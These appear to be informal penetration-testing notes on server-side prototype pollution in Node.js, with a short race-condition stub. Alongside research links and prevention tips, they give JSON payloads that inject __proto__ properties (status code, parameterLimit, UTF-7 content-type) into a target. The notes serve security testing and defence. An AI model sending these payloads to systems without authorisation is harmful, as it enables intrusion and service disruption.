## Prototype Pollution

#### Exploitation

- Vulnerable NodeJS libraries: [here](https://raw.githubusercontent.com/HoLyVieR/prototype-pollution-nsec18/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)
- Access prototype of an object via `__proto__` or `constructor.prototype` property
- Client-side prototype pollution vulnerabilities: [here](https://github.com/BlackFan/client-side-prototype-pollution)
- Safe Identification: [here](https://portswigger.net/research/server-side-prototype-pollution)
    - Status Code: `__proto__.status`
    - Parameter Limit: `__proto__.parameterLimit`
    - Content-Type: `__proto__.content-type`

#### Prevention

- Check user-supplied properties against a whitelist
- Freeze prototype by calling `Object.freeze()`
- Create object without prototype with `Object.create(null)`


1- Manipulate Status code :
	-provide bad json body and check the response code , lets say its 400
	-send ""
	
	    "__proto__":{
	        "status":555
	    }
	    OR
	    "constructor": {
		    "prototype": {
			      "status":555 ,
			      "statusCode": 555
		    }
		  }
	
	-send the bad json body again and check if the status code changed

2-Parameter Limiting :
	- if GET params are reflect in response i.e ?test=123&man=234 and the body contain "test":"123","man":"234"
	- send
	`{`
	    `"__proto__":{`
	        `"parameterLimit":1`
	    `}`
	`}`
	it can also 

	- now sent the params again and check if both are reflected or only 1 

3-Content type
	- we need a param reflected in the response
	- craft a UTF-7 word i.e    "HelloWorld+ACEAIQAh-" which equals HelloWorld!!!
	- now send it and notice it reflected with out decoding
	- now send
	{
	    "__proto__":{
	        "content-type":"application/json; charset=utf-7"
	    }
	}
	
	now resend "HelloWorld+ACEAIQAh-" and check if its reflected the same or HelloWorld!!!



# Race Condition

-check the timing of the responses
-Try race condition: each request with diff session 